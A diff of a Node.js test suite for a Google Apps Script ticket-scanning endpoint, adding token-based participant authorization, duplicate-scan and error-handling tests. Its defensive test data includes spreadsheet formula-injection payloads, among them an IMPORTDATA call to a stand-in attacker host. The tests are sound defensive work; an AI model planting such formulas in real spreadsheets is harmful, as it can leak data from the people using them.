@@ -1,81 +1,284 @@
-const assert = require('assert');
-const fs = require('fs');
-const vm = require('vm');
+const assert = require('node:assert/strict');
+const crypto = require('node:crypto');
+const fs = require('node:fs');
+const vm = require('node:vm');
 
-const rows = [];
-const response = (text) => ({
-  text,
-  setMimeType() { return this; }
-});
-const context = {
-  ContentService: {
-    MimeType: { JSON: 'json' },
-    createTextOutput: response
-  },
-  LockService: {
-    getScriptLock: () => ({ waitLock() {}, releaseLock() {} })
-  },
-  SpreadsheetApp: {
-    getActiveSpreadsheet: () => ({
-      getSheetByName: () => ({
-        appendRow: (row) => rows.push(row),
-        getLastRow: () => rows.length
-      })
-    })
+const VALID_TOKEN = 'a'.repeat(64);
+const UNKNOWN_TOKEN = 'c'.repeat(64);
+const INACTIVE_TOKEN = 'b'.repeat(64);
+
+function sha256(value) {
+  return crypto.createHash('sha256').update(value, 'utf8').digest('hex');
+}
+
+class FakeRange {
+  constructor(sheet, row, column, numRows = 1, numColumns = 1) {
+    this.sheet = sheet;
+    this.row = row;
+    this.column = column;
+    this.numRows = numRows;
+    this.numColumns = numColumns;
   }
-};
 
-vm.createContext(context);
-vm.runInContext(fs.readFileSync('Code.gs', 'utf8'), context);
+  getValues() {
+    return Array.from({ length: this.numRows }, (_, rowOffset) =>
+      Array.from({ length: this.numColumns }, (_, columnOffset) =>
+        this.sheet.rows[this.row - 1 + rowOffset]?.[this.column - 1 + columnOffset] ?? ''
+      )
+    );
+  }
 
-function postRequest(uni, uuid) {
-  const output = context.doPost({
-    postData: { contents: JSON.stringify({ uni, uuid }) },
-    parameter: {}
-  });
+  setValues(values) {
+    for (let rowOffset = 0; rowOffset < this.numRows; rowOffset += 1) {
+      for (let columnOffset = 0; columnOffset < this.numColumns; columnOffset += 1) {
+        this.sheet.setCell(
+          this.row + rowOffset,
+          this.column + columnOffset,
+          values[rowOffset][columnOffset]
+        );
+      }
+    }
+    return this;
+  }
+
+  setValue(value) {
+    this.sheet.setCell(this.row, this.column, value);
+    return this;
+  }
+
+  getValue() {
+    return this.getValues()[0][0];
+  }
+
+  setFontWeight() {
+    return this;
+  }
+
+  getRow() {
+    return this.row;
+  }
+
+  getNumRows() {
+    return this.numRows;
+  }
+}
+
+class FakeSheet {
+  constructor(name, rows = []) {
+    this.name = name;
+    this.rows = rows.map(row => [...row]);
+  }
+
+  getName() {
+    return this.name;
+  }
+
+  getLastRow() {
+    return this.rows.length;
+  }
+
+  getLastColumn() {
+    return this.rows.reduce((max, row) => Math.max(max, row.length), 0);
+  }
+
+  getRange(row, column, numRows = 1, numColumns = 1) {
+    return new FakeRange(this, row, column, numRows, numColumns);
+  }
+
+  appendRow(row) {
+    this.rows.push([...row]);
+    return this;
+  }
+
+  setCell(row, column, value) {
+    while (this.rows.length < row) this.rows.push([]);
+    while (this.rows[row - 1].length < column) this.rows[row - 1].push('');
+    this.rows[row - 1][column - 1] = value;
+  }
+}
+
+class FakeSpreadsheet {
+  constructor(sheetDefinitions) {
+    this.sheets = new Map(
+      Object.entries(sheetDefinitions).map(([name, rows]) => [name, new FakeSheet(name, rows)])
+    );
+  }
+
+  getSheetByName(name) {
+    return this.sheets.get(name) ?? null;
+  }
+
+  insertSheet(name) {
+    const sheet = new FakeSheet(name);
+    this.sheets.set(name, sheet);
+    return sheet;
+  }
+}
+
+function defaultSheets() {
+  return {
+    Raw_Scans: [
+      ['Timestamp', 'Uni_ID', 'UUID']
+    ],
+    participant_url: [
+      ['Participant_Name', 'Participant_ID', 'Token_Hash', 'Active', 'Scanner_URL'],
+      [
+        'Constructor University',
+        'constructor',
+        sha256(VALID_TOKEN),
+        true,
+        `https://scanner.example/?uni=constructor#token=${VALID_TOKEN}`
+      ],
+      [
+        'Inactive University',
+        'inactive',
+        sha256(INACTIVE_TOKEN),
+        false,
+        `https://scanner.example/?uni=inactive#token=${INACTIVE_TOKEN}`
+      ]
+    ],
+    valid_tickets: [
+      ['UUID'],
+      ['A1B2C3D4'],
+      ['12345678']
+    ]
+  };
+}
+
+function createEnvironment(sheetDefinitions = defaultSheets()) {
+  const spreadsheet = new FakeSpreadsheet(sheetDefinitions);
+  let lockReleases = 0;
+  const loggedErrors = [];
+  const context = {
+    console: {
+      error(message) { loggedErrors.push(String(message)); },
+      log() {}
+    },
+    ContentService: {
+      MimeType: { JSON: 'json' },
+      createTextOutput(text) {
+        return {
+          text,
+          setMimeType() { return this; }
+        };
+      }
+    },
+    LockService: {
+      getScriptLock() {
+        return {
+          waitLock() {},
+          releaseLock() { lockReleases += 1; }
+        };
+      }
+    },
+    SpreadsheetApp: {
+      getActiveSpreadsheet: () => spreadsheet
+    },
+    Utilities: {
+      DigestAlgorithm: { SHA_256: 'SHA_256' },
+      Charset: { UTF_8: 'UTF_8' },
+      computeDigest(algorithm, value) {
+        assert.equal(algorithm, 'SHA_256');
+        return [...crypto.createHash('sha256').update(value, 'utf8').digest()]
+          .map(byte => byte > 127 ? byte - 256 : byte);
+      }
+    }
+  };
+
+  vm.createContext(context);
+  vm.runInContext(fs.readFileSync('Code.gs', 'utf8'), context, { filename: 'Code.gs' });
+  return { context, spreadsheet, loggedErrors, lockReleases: () => lockReleases };
+}
+
+function parseResponse(output) {
   return JSON.parse(output.text);
 }
 
-function getRequest(uni, uuid) {
-  const output = context.doGet({
-    parameter: { uni, uuid, timestamp: '2026-07-27T12:00:00.000Z' }
+function postRequest(context, {
+  participantId = 'constructor',
+  token = VALID_TOKEN,
+  uuid = 'A1B2C3D4',
+  timestamp = '2026-07-27T12:00:00.000Z'
+} = {}) {
+  return parseResponse(context.doPost({
+    parameter: {
+      participant_id: participantId,
+      token,
+      uuid,
+      timestamp
+    },
+    postData: {
+      type: 'application/x-www-form-urlencoded',
+      contents: new URLSearchParams({
+        participant_id: participantId,
+        token,
+        uuid,
+        timestamp
+      }).toString()
+    }
+  }));
+}
+
+{
+  const { context, spreadsheet, lockReleases } = createEnvironment();
+  const rawScans = spreadsheet.getSheetByName('Raw_Scans');
+
+  assert.deepEqual(parseResponse(context.doGet({ parameter: {} })), {
+    result: 'error',
+    code: 'method_not_allowed'
   });
-  return JSON.parse(output.text);
+  assert.equal(rawScans.getLastRow(), 1, 'GET must never append a scan');
+
+  assert.deepEqual(postRequest(context), {
+    result: 'success',
+    duplicate: false
+  });
+  assert.equal(rawScans.getLastRow(), 2);
+  assert.equal(rawScans.rows[1][1], 'constructor');
+  assert.equal(rawScans.rows[1][2], 'A1B2C3D4');
+  assert.equal(lockReleases(), 1);
+
+  assert.deepEqual(postRequest(context), {
+    result: 'success',
+    duplicate: true
+  });
+  assert.equal(rawScans.getLastRow(), 2, 'duplicate scans must not append');
+  assert.equal(lockReleases(), 2);
 }
 
-function assertRejected(request, uni, uuid, label) {
-  const rowCount = rows.length;
-  assert.strictEqual(request(uni, uuid).result, 'error', label);
-  assert.strictEqual(rows.length, rowCount, `${label} must not append a row`);
+for (const [label, request, expectedCode] of [
+  ['mismatched participant ID', { participantId: 'ie' }, 'unauthorized'],
+  ['unknown token', { token: UNKNOWN_TOKEN }, 'unauthorized'],
+  ['inactive participant', { participantId: 'inactive', token: INACTIVE_TOKEN }, 'unauthorized'],
+  ['unknown ticket', { uuid: 'ZZZZZZZZ' }, 'invalid_ticket'],
+  ['short token', { token: 'abc' }, 'invalid_request'],
+  ['lowercase ticket', { uuid: 'a1b2c3d4' }, 'invalid_request'],
+  ['formula participant', { participantId: '=IMPORTDATA' }, 'invalid_request'],
+  ['invalid timestamp', { timestamp: 'not-a-date' }, 'invalid_request']
+]) {
+  const { context, spreadsheet } = createEnvironment();
+  const response = postRequest(context, request);
+  assert.equal(response.result, 'error', label);
+  assert.equal(response.code, expectedCode, label);
+  assert.equal(
+    spreadsheet.getSheetByName('Raw_Scans').getLastRow(),
+    1,
+    `${label} must not append`
+  );
+  assert.doesNotMatch(JSON.stringify(response), new RegExp(request.token ?? VALID_TOKEN));
 }
 
-assert.strictEqual(postRequest('HARVARD', 'A1B2C3D4').result, 'success');
-assert.strictEqual(rows.length, 1);
-assert.strictEqual(rows[0][1], 'HARVARD');
-assert.strictEqual(rows[0][2], 'A1B2C3D4');
-
-assert.strictEqual(getRequest('MIT_2026', 'F0E1D2C3').result, 'success');
-assert.strictEqual(rows.length, 2);
-assert.strictEqual(rows[1][1], 'MIT_2026');
-assert.strictEqual(rows[1][2], 'F0E1D2C3');
-
-const customUniversityIds = [
-  'Harvard Admissions',
-  'tsu-2026',
-  "St. John's (Main)",
-  'თსუ',
-  'NABA/IU'
-];
-
-for (const [index, uni] of customUniversityIds.entries()) {
-  const request = index % 2 === 0 ? getRequest : postRequest;
-  const rowCount = rows.length;
-  assert.strictEqual(request(uni, 'A1B2C3D4').result, 'success', `custom uni ${index}`);
-  assert.strictEqual(rows.length, rowCount + 1);
-  assert.strictEqual(rows[rowCount][1], uni);
+{
+  const sheets = defaultSheets();
+  delete sheets.valid_tickets;
+  const { context, loggedErrors } = createEnvironment(sheets);
+  const response = postRequest(context);
+  assert.deepEqual(response, { result: 'error', code: 'server_error' });
+  assert.equal(loggedErrors.length, 1);
+  assert.doesNotMatch(JSON.stringify(response), new RegExp(VALID_TOKEN));
 }
 
-const dangerousValues = [
+for (const value of [
   '=IMPORTDATA("https://attacker.example")',
   "'=1+1",
   "''+SUM(A:A)",
@@ -89,40 +292,9 @@ const dangerousValues = [
   '\uFF0B1+1',
   '\uFF0D1+1',
   '\uFF201+1'
-];
-
-for (const [index, value] of dangerousValues.entries()) {
-  for (const [method, request] of [['POST', postRequest], ['GET', getRequest]]) {
-    assertRejected(request, value, 'A1B2C3D4', `${method} dangerous uni ${index}`);
-    assertRejected(request, 'HARVARD', value, `${method} dangerous uuid ${index}`);
-  }
-}
-
-assert.strictEqual(getRequest('A'.repeat(50), '12345678').result, 'success');
-assertRejected(getRequest, 'A'.repeat(51), '12345678', 'uni longer than 50 characters');
-for (const value of [
-  '',
-  ' HARVARD',
-  'HARVARD ',
-  'HAR\nVARD',
-  'HAR\tVARD',
-  'A\\B',
-  'A:B',
-  'A*B',
-  'A?B',
-  'A"B',
-  'A<B',
-  'A>B',
-  'A|B'
 ]) {
-  assertRejected(postRequest, value, 'A1B2C3D4', `unsafe custom uni ${JSON.stringify(value)}`);
+  const { context } = createEnvironment();
+  assert.equal(context.neutralizeFormula(value), `'${value}`);
 }
-assertRejected(postRequest, 'HARVARD', 'A1B2C3D', 'uuid shorter than 8 characters');
-assertRejected(postRequest, 'HARVARD', 'a1b2c3d4', 'lowercase uuid');
 
-for (const value of dangerousValues) {
-  assert.strictEqual(context.neutralizeFormula(value), `'${value}`);
-}
-assert.strictEqual(context.neutralizeFormula('SAFE'), 'SAFE');
-
-console.log('Code.gs request validation tests passed');
+console.log('Code.gs authorization tests passed');
